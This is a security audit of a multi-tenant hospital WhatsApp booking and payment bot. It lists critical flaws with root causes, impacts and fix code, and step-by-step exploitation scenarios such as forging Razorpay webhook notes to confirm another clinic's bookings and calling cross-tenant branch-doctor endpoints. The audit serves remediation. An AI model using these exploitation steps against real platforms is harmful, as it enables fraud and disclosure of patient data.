# Forensic Production Audit — hospital-bot (Kriya AI / MediAssist AI)

**Date:** 2026-08-22
**Scope:** WhatsApp engine, booking/concurrency, payments, multi-tenancy & authz, DPDP/NABH compliance, lab intake + MocDoc connectors, async architecture.
**Method:** Full read of `app/main.py`, `app/database.py`, `app/services/{payment,whatsapp,conversation,tenant,message_queue,permissions,lab_reports,report_summarizer,data_retention}.py`, `app/routers/{webhook,razorpay_webhook,admin}.py`, `app/utils/{security,pii_sanitizer}.py`, `connectors/mocdoc/worker.py`, `migrations/008,009,012,025,026,039`, plus targeted reads of `admin/index.html`.

## Severity Roll-Up

| # | Severity | Title | Location |
|---|---|---|---|
| C1 | CRITICAL | Tenant fallback misroutes unknown WhatsApp numbers to an arbitrary clinic | `app/services/tenant.py:105-127` |
| C2 | CRITICAL | Razorpay webhook booking lookup is not clinic-scoped | `app/services/payment.py:403-439` |
| C3 | CRITICAL | Payment link never expires at Razorpay while the slot hold expires in 10 min | `app/services/payment.py:1103-1115`, `143-147`, `519` |
| C4 | CRITICAL | Admin reject cancels the booking before refunding, permanently blocking the refund | `app/services/payment.py:860-899`, `734-738` |
| C5 | CRITICAL | Message idempotency fails **open** on any DB error | `app/services/message_queue.py:140-151` |
| C6 | CRITICAL | Duplicate lab-report PHI delivery — check-then-act with the WhatsApp send inside the race window | `app/services/lab_reports.py:50-72`, `249-277` |
| C7 | CRITICAL | Cross-tenant IDOR: branch-doctor endpoints accept any `branch_id` | `app/routers/admin.py:3840-3990` |
| H1 | HIGH | `_can_send_freeform` returns `True` in its exception handler | `app/services/whatsapp.py:552-574` |
| H2 | HIGH | Delivery receipts applied with no ordering guard and no clinic scope | `app/routers/webhook.py:101-122` |
| H3 | HIGH | Slot availability ignores `pending_payment` holds | `app/database.py:406-416` |
| H4 | HIGH | Same-day slot cutoff uses naive server-local time against IST slot strings | `app/database.py:486-488` |
| H5 | HIGH | PII sanitizer defeated — patient name sent to OpenRouter in plaintext | `app/services/report_summarizer.py:60-64` |
| H6 | HIGH | Stored XSS via unescaped values in inline-JS string context | `admin/index.html:2978`, `3711` |
| H7 | HIGH | Razorpay webhook router has no exception guard | `app/routers/razorpay_webhook.py` |
| H8 | HIGH | Unguarded `clinic['name']` deref after an explicit `None` check | `app/routers/webhook.py:161-205` |
| H9 | HIGH | Cross-tenant reads: payment events + daily reconciliation | `app/routers/admin.py:2356`, `app/services/payment.py:958-997` |
| H10 | HIGH | Synchronous Supabase client called from every `async def` | `app/database.py:22` |
| M1 | MEDIUM | `asyncio.gather` over blocking sync calls — false parallelism | `app/database.py:425-430` |
| M2 | MEDIUM | `sanitize_report_text()` tuple misuse silently kills connector debug capture | `connectors/mocdoc/worker.py:990` |
| M3 | MEDIUM | `_alert_admin` always pages the platform phone, never the clinic | `app/services/payment.py:1447-1459` |
| M4 | MEDIUM | Bare `asyncio.create_task` — tasks can be garbage-collected mid-flight | `app/routers/webhook.py:179` |
| M5 | MEDIUM | Patient-side cancel/status queries not clinic-scoped | `app/services/conversation.py:2842-2867` |
| M6 | MEDIUM | `enforce_branch_scope` is not an ownership check | `app/services/permissions.py` |
| M7 | LOW | Hardcoded "10 minutes" copy vs configurable `booking_hold_minutes` | `app/services/conversation.py:2563` |
| M8 | LOW | Age/DOB regexes over-redact lab values, degrading summaries | `app/utils/pii_sanitizer.py:42-52` |
| L1 | LOW | CSP `script-src 'unsafe-inline'` negates XSS hardening | `app/utils/security.py` |
| L2 | LOW | Dead-letter queue stores full raw webhook payload (PHI) unencrypted | `app/routers/webhook.py:140-148` |

---

# CRITICAL

## C1 — Tenant fallback misroutes unknown WhatsApp numbers to an arbitrary clinic

**[LOCATION]** `app/services/tenant.py:105-127`

**[ROOT CAUSE]**
When the `clinics` lookup returns *zero rows* (query succeeded, no match), `resolve_tenant()` does not raise `TenantNotFound`. It selects the first active clinic ordered by `created_at` and then **caches that clinic under the unmatched phone number** for 5 minutes. The "single-tenant mode" intent is sound, but the guard for it is "no row matched", which is also exactly the signal for "this number belongs to a clinic that was deactivated, renumbered, or never onboarded."

```python
fallback = (
    supabase.table("clinics").select("*")
    .eq("is_active", True).neq("status", "DELETED")
    .order("created_at").limit(1).execute()
)
if fallback.data:
    clinic = fallback.data[0]
    _set_cached_item(_tenant_cache, phone, clinic)   # ← poisons cache
    return clinic
```

**[REAL-WORLD FAILURE SCENARIO]**
1. Clinic B (a diagnostic centre) changes its Meta WhatsApp number, or an admin flips `is_active=false` during a billing dispute.
2. A patient of Clinic B sends "Hi". Meta delivers `display_phone_number = +91<B's number>`; no row matches.
3. Fallback returns Clinic A — the *oldest* clinic on the platform, a different hospital.
4. `conversation.py` creates a patient row under `clinic_id = A`, shows **Clinic A's** doctors, fees, and branch addresses, and books an appointment in Clinic A's calendar.
5. The result is cached for 300s, so every patient of Clinic B for the next 5 minutes is funnelled into Clinic A. With 20 patients/min at morning rush, ~100 patients are misrouted per cache cycle, and each cycle re-poisons.

**[DATABASE / SECURITY IMPACT]**
Cross-tenant write of patient PII and clinical intent (symptoms) into an unrelated hospital's tenant. Clinic A's staff see other hospitals' patients in the admin panel — an unauthorised PHI disclosure and a DPDP §8 breach requiring notification to the Data Protection Board. Clinic A's slot inventory is consumed by non-patients. Because the misrouted rows carry a valid `clinic_id`, every downstream RLS policy and `clinic_id` filter treats the leak as legitimate data.

**[PRODUCTION-READY FIX]**
Only fall back when the platform is genuinely single-tenant (exactly one clinic exists). Never cache a fallback under a foreign phone number.

```python
# app/services/tenant.py — replace lines 105-127
    # Fallback: single-tenant mode ONLY.
    # A zero-row lookup on a multi-tenant platform means the number is unknown
    # or the clinic was deactivated — NOT "use whichever clinic is oldest".
    # Misrouting a patient into another hospital's tenant is a PHI breach, so
    # we fail closed unless exactly one clinic exists on the whole platform.
    try:
        actives = (
            supabase.table("clinics")
            .select("id, name, whatsapp_number, plan, is_active, status, config, features")
            .eq("is_active", True)
            .neq("status", "DELETED")
            .limit(2)                      # 2 is enough to tell "one" from "many"
            .execute()
        )
        rows = actives.data or []
        if len(rows) == 1:
            clinic = rows[0]
            # Cache under the clinic's OWN number, never under the unmatched one.
            own = clinic.get("whatsapp_number")
            if own:
                _set_cached_item(_tenant_cache, own, clinic)
            logger.info(
                f"Single-tenant mode: routing {phone} to sole clinic {clinic.get('id')}"
            )
            return clinic
        if len(rows) > 1:
            logger.error(
                f"TENANT_UNKNOWN: {phone} matched no clinic and platform is "
                f"multi-tenant — refusing to guess. Check clinics.whatsapp_number."
            )
            raise TenantNotFound(f"No clinic registered for {phone}")
    except TenantNotFound:
        raise
    except Exception as e:
        logger.error(f"Fallback clinic lookup failed for {phone}: {e}")
        raise RuntimeError(f"Tenant resolution failed for {phone}") from e

    # Zero clinics in DB at all — bare-metal/dev bootstrap only.
    if settings.app_env == "production":
        raise TenantNotFound(f"No clinics configured; cannot route {phone}")
    clinic = _build_fallback_clinic()
    _set_cached_item(_tenant_cache, phone, clinic)
    return clinic
```

Callers already handle this: `process_message_safe` (`app/routers/webhook.py:132-152`) catches the exception and writes the message to `failed_messages` for replay once the number is registered — the correct behaviour.

---

## C2 — Razorpay webhook booking lookup is not clinic-scoped

**[LOCATION]** `app/services/payment.py:403-439` (three lookup branches), consumed by `app/routers/razorpay_webhook.py`

**[ROOT CAUSE]**
The webhook URL is per-clinic (`POST /webhooks/razorpay/{clinic_id}`) and the HMAC is verified against that clinic's secret — but once verified, the booking is resolved by identifiers taken from the **payload body** with no `clinic_id` filter:

```python
.eq("razorpay_payment_link_id", payment_link_id)   # L405-411
.eq("id", booking_id_from_notes)                   # L414-419  ← attacker-chosen UUID
.eq("booking_ref", booking_ref)                    # L425-430  ← attacker-chosen ref
```

The `notes` object is arbitrary data that the *account holder* controls when creating a payment link. Any clinic on the platform holds a valid signing secret for its own webhook path.

**[REAL-WORLD FAILURE SCENARIO]**
1. Clinic A is a paying tenant with its own Razorpay keys. Its staff can create payment links in their own Razorpay dashboard.
2. Clinic A creates a ₹1 payment link with `notes = {"booking_id": "<UUID of Clinic B's pending booking>"}` and pays it themselves.
3. Razorpay fires `payment.captured` to `/webhooks/razorpay/<clinic_A_id>`, signed with Clinic A's secret. Signature verification passes.
4. Lookup branch 2 matches Clinic B's booking by raw UUID. `_handle_payment_captured` flips it to `confirmed`, writes `payment_id`, increments B's patient visit count, and dispatches a WhatsApp confirmation to **B's patient** from B's number.
5. Booking refs are also guessable — `BOOKING_REF_PREFIX` + short sequence — so branch 3 gives the same result without needing a UUID.

**[DATABASE / SECURITY IMPACT]**
Cross-tenant privilege escalation and financial fraud: any tenant can confirm any other tenant's unpaid bookings for ₹1, consuming the victim clinic's slot inventory and corrupting its revenue reconciliation. It also works in reverse for refund/failure events. `payment_events` records the forged event as authentic (the append-only trigger from migration 008 makes the bogus record permanent). This is a straight BOLA on the highest-value object in the system.

**[PRODUCTION-READY FIX]**
Thread the path-derived `clinic_id` into every lookup. It is already available — `razorpay_webhook.py` uses it to pick the signing secret.

```python
# app/services/payment.py — inside process_payment_webhook, replace the three
# lookup branches at L403-439.
#
# clinic_id here MUST be the value from the webhook PATH (used to select the
# signing secret), never a value read out of the payload body. Payload `notes`
# are attacker-controlled by any tenant holding a Razorpay account.
        booking = None
        if not clinic_id:
            logger.error("Razorpay webhook: missing clinic scope — refusing to process")
            return {"success": False, "reason": "missing_clinic_scope"}

        def _scoped():
            return supabase.table("appointments").select("*").eq("clinic_id", clinic_id)

        if payment_link_id:
            res = _scoped().eq("razorpay_payment_link_id", payment_link_id).execute()
            if res.data:
                booking = res.data[0]

        if not booking:
            booking_id_from_notes = notes.get("booking_id")
            if booking_id_from_notes:
                res = _scoped().eq("id", booking_id_from_notes).execute()
                if res.data:
                    booking = res.data[0]

        if not booking:
            booking_ref = notes.get("booking_ref") or payment_link_entity.get("reference_id")
            if booking_ref:
                res = _scoped().eq("booking_ref", booking_ref).execute()
                if res.data:
                    booking = res.data[0]

        if not booking:
            # Log to the orphan ledger so finance can reconcile manually, and
            # alert — a captured payment with no matching booking is money held.
            logger.error(
                f"ORPHAN_PAYMENT clinic={clinic_id} link={payment_link_id} "
                f"event={event_type} — no matching booking in this tenant"
            )
            self._log_orphan_payment_event(None, event_type, payload)
            return {"success": False, "reason": "booking_not_found_in_clinic"}
```

And make the caller pass it explicitly:

```python
# app/routers/razorpay_webhook.py
    result = await payment_service.process_payment_webhook(
        raw_body=raw_body,
        signature=signature,
        secret=webhook_secret,
        clinic_id=clinic_id,      # ← path-derived, authoritative
    )
```

Add a regression test asserting that a payload whose `notes.booking_id` points at another clinic's booking returns `booking_not_found_in_clinic` and leaves that booking `pending_payment`.

---

## C3 — Payment link never expires at Razorpay while the slot hold expires in 10 minutes

**[LOCATION]** `app/services/payment.py:1103-1115` (link creation), `143-147` (hold), `599-703` (expiry sweeper), `519` (accepts `expired`)

**[ROOT CAUSE]**
`_create_payment_link` builds the Razorpay Payment Link payload with **no `expire_by` field**:

```python
link_data = {
    "amount": amount_paise, "currency": "INR", "accept_partial": False,
    "description": f"Appointment booking {booking_ref}",
    "customer": {...}, "notify": {...},
    "reference_id": booking_ref,
    "notes": {"booking_id": booking_id, "booking_ref": booking_ref},
}   # ← no expire_by
```

A Razorpay Payment Link with no `expire_by` stays payable indefinitely. Meanwhile `hold_expires_at` is `now + settings.booking_hold_minutes` (default **10**), and `expire_stale_bookings()` flips the row to `expired` and releases the slot. The two clocks are unrelated, so the system's own contract — "this slot is held for 10 minutes" — is enforced on the database but not on the payment instrument the patient is holding in WhatsApp.

**[REAL-WORLD FAILURE SCENARIO]**
1. 08:31 — Patient P1 taps *Confirm*. Booking `pending_payment`, `idx_unique_active_slot` reserves Dr Rao 10:00. WhatsApp shows the `rzp.io/i/xxxx` link.
2. P1 is on a train; the UPI app takes three attempts.
3. 08:41 — the sweeper runs. `_check_payment_link_status` returns `created` (not yet paid), so the normal expiry path sets `status='expired'`; the partial unique index no longer covers the row and the slot returns to the pool.
4. 08:42 — Patient P2 books Dr Rao 10:00 and pays. Row is `confirmed`.
5. 08:46 — P1's UPI collect finally succeeds. Razorpay captures ₹500 and fires `payment.captured`.
6. `_handle_payment_captured` reaches L519, whose guard is `if current_status not in ("pending_payment", "expired")` — `expired` is **allowed** — so it attempts `UPDATE appointments SET status='confirmed'` on P1's row.
7. That UPDATE now collides with P2's confirmed row on `idx_unique_active_slot` → Postgres `23505`. The exception is uncaught in `process_payment_webhook`, propagates through `razorpay_webhook.py` (which has no try/except — see H7) → HTTP 500.
8. Razorpay treats 5xx as a delivery failure and retries the webhook on its backoff schedule. Every retry raises again.
9. Terminal state: **₹500 captured, no booking, no refund, no alert, no ledger entry** — the webhook never reached `_log_payment_event`. P1 has a bank debit and a WhatsApp thread that says "waiting for your payment".

**[DATABASE / SECURITY IMPACT]**
Silent financial loss for the patient and an unrecorded liability for the clinic. RBI/NPCI chargeback exposure with no audit trail to defend against it, because `payment_events` has no row for the captured payment. Under morning-rush concurrency this is not an edge case — every patient who pays between hold-expiry and slot resale hits it. It also produces a webhook retry storm that consumes the event loop (compounding H10).

**[PRODUCTION-READY FIX]**
Three coordinated changes: (a) bound the link at Razorpay, (b) make the late-payment path an explicit auto-refund instead of a doomed confirm, (c) alert.

```python
# app/services/payment.py — (a) _create_payment_link, replace link_data
        # Razorpay requires expire_by >= now + 15 min. Our internal hold may be
        # shorter, so use max(hold, 16 min) and let the reconciler own anything
        # that lands in the gap. Without expire_by the link is payable forever,
        # which orphans money after the slot is resold.
        import time
        expire_by = int(time.time()) + max(settings.booking_hold_minutes * 60, 16 * 60)

        link_data = {
            "amount": amount_paise,
            "currency": "INR",
            "accept_partial": False,
            "description": f"Appointment booking {booking_ref}",
            "customer": {"name": patient_name, "contact": patient_phone},
            "notify": {"sms": False, "email": False},
            "reference_id": booking_ref,
            "expire_by": expire_by,
            "reminder_enable": False,
            "notes": {"booking_id": booking_id, "booking_ref": booking_ref},
        }
```

```python
# app/services/payment.py — (b) _handle_payment_captured, replace the L519 guard
        # A payment that lands after the hold expired must NOT try to re-confirm:
        # the slot may already be sold, and the UPDATE would violate
        # idx_unique_active_slot and 500 the webhook (Razorpay then retries
        # forever while the patient's money sits captured).
        if current_status == "expired":
            logger.warning(
                f"LATE_PAYMENT booking={booking['id']} ref={booking.get('booking_ref')} "
                f"payment_id={payment_id} — hold already expired, auto-refunding"
            )
            self._log_payment_event(
                booking["id"], "late_payment_after_expiry",
                {"payment_id": payment_id, "amount_paise": amount_paise},
            )
            refund = await self._refund_payment_id(
                payment_id=payment_id,
                amount_paise=amount_paise,
                booking_id=booking["id"],
                reason="Payment received after slot hold expired",
                clinic=clinic,
            )
            supabase.table("appointments").update({
                "status": "refunded_late_payment",
                "payment_id": payment_id,
                "refund_id": refund.get("refund_id"),
            }).eq("id", booking["id"]).eq("status", "expired").execute()

            await self._notify_late_payment_refunded(booking, refund)
            await self._alert_admin(
                clinic,
                f"Late payment auto-refunded: {booking.get('booking_ref')} "
                f"({amount_paise / 100:.0f} INR). Slot was already released.",
            )
            return {"success": True, "action": "late_payment_refunded"}

        if current_status != "pending_payment":
            logger.info(
                f"Ignoring {event_type} for booking {booking['id']} in status "
                f"{current_status} (idempotent no-op)"
            )
            return {"success": True, "action": "noop_status_" + current_status}
```

```python
# app/services/payment.py — (c) new helper: refund by payment_id, no status gate.
# initiate_refund() intentionally refuses non-confirmed bookings; the late-payment
# path needs a refund that is driven by the Razorpay payment, not by our row state.
    async def _refund_payment_id(
        self,
        payment_id: str,
        amount_paise: int,
        booking_id: str,
        reason: str,
        clinic: Optional[dict] = None,
    ) -> dict:
        key_id, key_secret, _ = get_razorpay_creds(clinic or {})
        try:
            async with httpx.AsyncClient() as client:
                resp = await client.post(
                    f"{self._razorpay_base}/payments/{payment_id}/refund",
                    json={"amount": amount_paise, "notes": {"reason": reason[:255]}},
                    headers={"X-Razorpay-Idempotency-Key": f"late-{payment_id}"},
                    auth=(key_id, key_secret),
                    timeout=15.0,
                )
                resp.raise_for_status()
                data = resp.json()
            self._log_payment_event(
                booking_id, "auto_refund_issued",
                {"payment_id": payment_id, "refund_id": data.get("id"), "reason": reason},
            )
            return {"success": True, "refund_id": data.get("id")}
        except Exception as e:
            # Never swallow: an un-refunded capture is money we owe the patient.
            logger.error(f"AUTO_REFUND_FAILED payment={payment_id}: {e}")
            self._log_payment_event(
                booking_id, "auto_refund_failed",
                {"payment_id": payment_id, "error": str(e)[:500], "reason": reason},
            )
            return {"success": False, "error": str(e)}
```

Also fix the patient-facing copy so the stated window matches the enforced one — see M7.

---

## C4 — Admin reject cancels the booking before refunding, permanently blocking the refund

**[LOCATION]** `app/services/payment.py:860-899` (`admin_reject_booking`), `734-738` (`initiate_refund` status gate)

**[ROOT CAUSE]**
Ordering bug across two functions that each look correct in isolation:

```python
# admin_reject_booking, ~L866
supabase.table("appointments").update({"status": "cancelled", ...}) \
    .eq("id", booking_id).execute()
...
# ~L894
if booking.get("payment_id"):
    await self.initiate_refund(booking_id, reason=f"Admin rejected: {admin_notes}")

# initiate_refund, L734-738
if booking["status"] not in ("confirmed", "pending_review"):
    return {"success": False, "reason": f"cannot_refund_status_{booking['status']}"}
```

`initiate_refund` re-reads the booking from the database. By then the status is `cancelled`, which is not in the allow-list, so it returns `{"success": False}` — **and the caller never inspects the return value**. The reject reports success.

**[REAL-WORLD FAILURE SCENARIO]**
1. Patient pays ₹800 for a cardiology consult. Booking is `confirmed`, `payment_id` set.
2. The doctor calls in sick. A clinic admin opens the panel and clicks *Reject* with the note "Doctor unavailable".
3. Row flips to `cancelled`; the patient gets "your booking was cancelled" on WhatsApp.
4. `initiate_refund` returns `cannot_refund_status_cancelled`. No Razorpay refund API call is made. No exception, no log at ERROR, no admin alert.
5. The panel shows the rejection succeeded. `payment_events` has an `admin_reject` entry but no `refund_initiated`.
6. Discovery happens weeks later — via the patient, or not at all. Every admin-rejected paid booking since deploy is affected.

**[DATABASE / SECURITY IMPACT]**
Systematic retention of patient funds for services never rendered. Under the Consumer Protection Act this is an unfair trade practice; for the clinic it is an unrecorded liability that never appears in `get_daily_reconciliation`. The `payment_events` ledger — the system's evidence of correctness — actively certifies that a refund was requested when none was.

**[PRODUCTION-READY FIX]**
Refund first, cancel only on refund success, and surface failures.

```python
# app/services/payment.py — replace the body of admin_reject_booking (L860-899)
    async def admin_reject_booking(
        self, booking_id: str, clinic_id: str = "default", admin_notes: str = ""
    ) -> dict:
        """Reject a booking. Refund BEFORE cancelling.

        initiate_refund() re-reads the row and refuses anything that is not
        'confirmed'/'pending_review', so cancelling first makes the refund
        impossible — the patient's money would be silently retained.
        """
        res = (
            supabase.table("appointments")
            .select("*")
            .eq("id", booking_id)
            .eq("clinic_id", clinic_id)          # tenant scope — see C7/H9
            .execute()
        )
        if not res.data:
            return {"success": False, "reason": "booking_not_found"}
        booking = res.data[0]

        clinic = None
        try:
            from app.services.tenant import get_clinic_by_id
            clinic = await get_clinic_by_id(clinic_id)
        except Exception as e:
            logger.warning(f"Could not load clinic {clinic_id} for reject: {e}")

        # ── Step 1: refund while the row is still refundable ──
        refund_result = {"success": True, "reason": "no_payment_to_refund"}
        if booking.get("payment_id"):
            refund_result = await self.initiate_refund(
                booking_id,
                reason=f"Admin rejected: {admin_notes}"[:255],
                clinic=clinic,
            )
            if not refund_result.get("success"):
                # Do NOT cancel — leave the booking refundable and make the
                # failure loud so staff can retry or refund in the dashboard.
                logger.error(
                    f"REFUND_FAILED_ON_REJECT booking={booking_id} "
                    f"reason={refund_result.get('reason')}"
                )
                self._log_payment_event(
                    booking_id, "reject_aborted_refund_failed", refund_result
                )
                await self._alert_admin(
                    clinic,
                    f"Reject aborted for {booking.get('booking_ref')}: refund failed "
                    f"({refund_result.get('reason')}). Booking left CONFIRMED.",
                )
                return {
                    "success": False,
                    "reason": "refund_failed",
                    "detail": refund_result,
                }

        # ── Step 2: only now cancel ──
        update = (
            supabase.table("appointments")
            .update({
                "status": "cancelled",
                "admin_notes": admin_notes,
                "refund_id": refund_result.get("refund_id"),
            })
            .eq("id", booking_id)
            .eq("clinic_id", clinic_id)
            .in_("status", ["confirmed", "pending_review"])   # optimistic guard
            .execute()
        )
        if not update.data:
            return {"success": False, "reason": "booking_status_changed_concurrently"}

        self._log_payment_event(
            booking_id, "admin_reject",
            {"admin_notes": admin_notes, "refund": refund_result},
        )
        await self._notify_booking_rejected(booking, admin_notes, refund_result)
        return {"success": True, "refund": refund_result}
```

Audit the same pattern in `admin_cancel_booking` (`L902-946`) — it calls `initiate_refund` at L937; verify the status update does not precede it.

---

## C5 — Message idempotency fails **open** on any database error

**[LOCATION]** `app/services/message_queue.py:140-151`

**[ROOT CAUSE]**
`acquire()` claims a `wamid` by INSERTing into `processed_messages` and treating a unique violation as "already processed". Every *other* exception path calls `_record_fail_open()` and `return True` — i.e. "you own this message, go process it." A transient Supabase timeout therefore disables the platform's only cross-process duplicate guard.

The conversation-layer secondary guard (`conversation.py:241-243`, comparing `last_processed_message_id`) does not cover this: it is a single-row compare, so it stops a *sequential* redelivery but not two workers racing on the same `wamid`, and it is read before the write.

**[REAL-WORLD FAILURE SCENARIO]**
1. Supabase has a 30-second connection blip (routine on shared Postgres during autovacuum or a failover).
2. Meta has not received a 200 for webhook batch X, so it retries — Meta retries aggressively, typically within seconds.
3. Both the original delivery and the retry hit `acquire()`; both get a connection error; both fail open and return `True`.
4. On a two-instance Render deployment the per-phone `asyncio.Lock` does not span processes, so both `_handle_message_locked` calls run concurrently.
5. Both read `state='confirming_booking'`, both call `create_booking_with_payment`.
6. `idx_unique_active_slot` correctly rejects the second INSERT — so instead of a double booking, the patient receives **two payment links for the same slot**, or one link plus a spurious "slot taken, pick another" message. If the patient pays both links, C3's refund path (before this audit's fix) does not exist.

**[DATABASE / SECURITY IMPACT]**
Duplicate payment link generation and duplicate outbound WhatsApp messages (each billable, each counted against Meta quality rating). For non-booking flows it means duplicate `patients` rows, doubled analytics events, and duplicate feedback submissions. The DB unique index prevents true double-booking, so this is a money-and-trust defect rather than a data-corruption one — but it is the failure mode that produces the most patient-visible confusion.

**[PRODUCTION-READY FIX]**
Fail **closed** — with a bounded retry so a one-off blip does not drop a patient message, and a DLQ hand-off so nothing is lost.

```python
# app/services/message_queue.py — replace the fail-open block at L140-151
        except Exception as e:
            # Fail CLOSED. Failing open turns a transient DB blip into duplicate
            # bookings, duplicate payment links, and duplicate billable sends —
            # Meta retries within seconds, so the two collide.
            #
            # Retry the claim briefly (blips are short); if it still fails, refuse
            # the message and let the caller DLQ it for replay. A delayed reply is
            # recoverable; a duplicate payment link is not.
            for attempt in range(2):
                await asyncio.sleep(0.25 * (attempt + 1))
                try:
                    supabase.table("processed_messages").insert(
                        {"message_id": message_id, "clinic_id": clinic_id}
                    ).execute()
                    logger.info(
                        f"Idempotency claim succeeded on retry {attempt + 1} "
                        f"for {message_id}"
                    )
                    return True
                except Exception as retry_err:
                    if self._is_duplicate_error(retry_err):
                        logger.info(f"Duplicate {message_id} detected on retry")
                        return False
                    continue

            logger.error(
                f"IDEMPOTENCY_UNAVAILABLE for {message_id}: {e} — refusing to "
                f"process (fail-closed). Message will be dead-lettered for replay."
            )
            self._record_fail_closed()
            raise IdempotencyUnavailable(
                f"Could not claim message {message_id}: {e}"
            ) from e
```

```python
# app/services/message_queue.py — add near the top-level exceptions
class IdempotencyUnavailable(Exception):
    """The idempotency store is unreachable; the message must be retried later."""
```

```python
# app/routers/webhook.py — process_message, replace the acquire block (L164-171)
        from app.services.message_queue import IdempotencyUnavailable
        try:
            acquired = await message_queue.acquire(message_id, clinic_id=clinic_id)
        except IdempotencyUnavailable:
            # Re-raise: process_message_safe writes it to failed_messages, where
            # the retry job replays it once Supabase is healthy again.
            raise
        if not acquired:
            logger.info(f"Webhook: duplicate {message_id} dropped by atomic queue")
            return
```

Keep the existing `_record_fail_open` counter but rename/repoint it at the new counter so the health endpoint can alarm on `idempotency_unavailable > 0`.

---

## C6 — Duplicate lab-report PHI delivery: check-then-act with the WhatsApp send inside the race window

**[LOCATION]** `app/services/lab_reports.py:50-72` (guard), `98-212` (send), `249-277` (insert)

**[ROOT CAUSE]**
`upload_and_send` is a textbook check-then-act. Step 0 SELECTs `lab_reports` by `(clinic_id, external_report_id)`; the WhatsApp delivery happens in Steps D–F; the row that would make the SELECT return non-empty is only INSERTed at Step G. The entire PHI delivery sits inside the race window.

The DB constraint from migration 026 (`idx_lab_reports_clinic_external_report`) protects the *row*, not the *send* — and the code says so out loud:

```python
# L253-255
# Unique violation on (clinic_id, external_report_id) means another intake
# path won the race and already delivered this report — a WhatsApp message
# may have just gone out twice, but at least we don't record it twice.
```

The per-phone lock at L111 is `asyncio.Lock` — in-process only. It does not span the connector runner process, the web dyno, or multiple Render instances.

**[REAL-WORLD FAILURE SCENARIO]**
1. Two MocDoc Playwright workers are running (the admin panel's "Test connection" plus the scheduled runner — both trigger the same connector, per the known lock-lease behaviour).
2. Both `fetch_new_reports()` calls return report `VAM-39927_29220` because neither has written a `lab_reports` row yet.
3. Both call `upload_and_send`. Both pass Step 0.
4. Both extract, both call OpenRouter (2× LLM spend), both `upload_media`, both `send_text` + `send_document`.
5. The patient receives their haematology PDF **twice**, with two AI summaries that may differ (temperature/non-determinism), one possibly flagging abnormal values and the other not.
6. One INSERT wins; the loser hits `23505`, logs a warning, and returns the winner's record. The delivery log shows **one** delivery. Staff have no signal that two went out.
7. Worse variant: if the two intake paths resolved the patient differently — `patient_match.py` returning different `matched_patient_id`/phone for a low-confidence match — the report goes to **two different phone numbers**, one of them wrong.

**[DATABASE / SECURITY IMPACT]**
Duplicate PHI transmission; in the mismatched-phone variant, disclosure of a patient's lab results to an unrelated person — a reportable DPDP breach and an NABH information-security non-conformance. The delivery log under-reports actual sends, so the stat cards on `/admin/lab-reports/deliveries` can never reconcile against Meta's receipts. Doubled OpenRouter cost and doubled Meta conversation charges.

**[PRODUCTION-READY FIX]**
Claim before sending. Insert a `processing` row first — the unique index then arbitrates *before* any PHI leaves the building — then update it with the outcome.

```python
# app/services/lab_reports.py — replace Step 0 (L50-72) and Step G (L249-277)

        # ── Step 0 — ATOMIC CLAIM (replaces the old SELECT-then-act check) ──
        # Insert a 'processing' row first so the unique index
        # idx_lab_reports_clinic_external_report arbitrates BEFORE any PHI is
        # transmitted. A SELECT-based guard leaves the whole WhatsApp send inside
        # the race window, which delivers the report twice under concurrent
        # connector workers.
        claim_row_id = None
        if external_report_id:
            try:
                claim = (
                    supabase.table("lab_reports")
                    .insert({
                        "clinic_id": clinic_id,
                        "patient_phone": patient_phone,
                        "patient_name": patient_name,
                        "report_name": report_name,
                        "report_type": report_type,
                        "external_report_id": external_report_id,
                        "source": source,
                        "status": "processing",
                        "delivery_status": "processing",
                    })
                    .execute()
                )
                claim_row_id = claim.data[0]["id"] if claim.data else None
            except Exception as e:
                if "23505" in str(e):
                    existing = (
                        supabase.table("lab_reports").select("*")
                        .eq("clinic_id", clinic_id)
                        .eq("external_report_id", external_report_id)
                        .execute()
                    )
                    if existing.data:
                        logger.info(
                            f"Report {external_report_id} already claimed by "
                            f"{existing.data[0].get('source')} — skipping duplicate send"
                        )
                        record = dict(existing.data[0])
                        record["already_processed"] = True
                        return record
                # Claim store unavailable: fail CLOSED for connector-sourced
                # reports (the runner retries next cycle) but let an operator's
                # manual admin upload through — they can see the outcome.
                logger.error(f"Claim insert failed for {external_report_id}: {e}")
                if source != "admin":
                    raise
```

```python
        # ── Step G — finalise the claim (replaces the insert at L249-277) ──
        try:
            if claim_row_id:
                result = (
                    supabase.table("lab_reports")
                    .update(row)
                    .eq("id", claim_row_id)
                    .execute()
                )
            else:
                result = supabase.table("lab_reports").insert(row).execute()
            saved_record = result.data[0] if result.data else row
        except Exception as e:
            logger.error(f"Failed to persist lab report record: {e}")
            row["id"] = claim_row_id or str(uuid4())
            row["_db_error"] = str(e)
            saved_record = row
```

Add a sweeper (reuse the existing scheduler) that re-queues rows stuck in `status='processing'` for more than 15 minutes — that covers a worker crashing between claim and send. Then add the assertion test: two concurrent `upload_and_send` calls with the same `external_report_id` must produce exactly one `send_document` call.

---

## C7 — Cross-tenant IDOR: branch-doctor endpoints accept any `branch_id`

**[LOCATION]** `app/routers/admin.py:3840` (GET), `3862` (POST), `3916` (DELETE), `3949` (PUT); enabler at `app/services/permissions.py` (`enforce_branch_scope`)

**[ROOT CAUSE]**
These four endpoints take `branch_id` from the URL path and query/mutate `branch_doctors` and `doctors` **without joining back to the caller's `clinic_id`**. The only gate in front of them is `enforce_branch_scope`, which is not an ownership check:

```python
def enforce_branch_scope(user, branch_id):
    if user.role in ("clinic_admin", "super_admin"):
        return                      # ← unconditional pass
    if user.branch_id is None:
        return                      # ← staff with no branch pinned: pass
    if str(user.branch_id) != str(branch_id):
        raise HTTPException(403, ...)
```

It answers "is this staff member pinned to a different branch?", never "does this branch belong to the caller's clinic?". `get_branch_by_id` (`tenant.py:384-401`) also performs no clinic scoping, so nothing downstream recovers the check.

**[REAL-WORLD FAILURE SCENARIO]**
1. Clinic A's `clinic_admin` logs into the panel legitimately.
2. Branch UUIDs are exposed in Clinic A's own `GET /admin/branches` responses and are plain v4 UUIDs; an admin can also harvest them from any shared screenshot, or simply iterate if any deployment ever used sequential IDs.
3. `GET /admin/branches/<Clinic B branch UUID>/doctors` → returns Clinic B's full roster: names, registration numbers, departments, consultation fees, session timings.
4. `PUT /admin/branches/<B branch>/doctors/<B doctor>` → the attacker rewrites Dr X's Tuesday session to 02:00–03:00.
5. `DELETE /admin/branches/<B branch>/doctors/<B doctor>` → Dr X is unassigned entirely.
6. Clinic B's WhatsApp bot now offers no slots (or absurd ones) for that doctor. Patients are told "no availability". `roster_management` shows nothing wrong from B's side because the rows were legitimately modified.

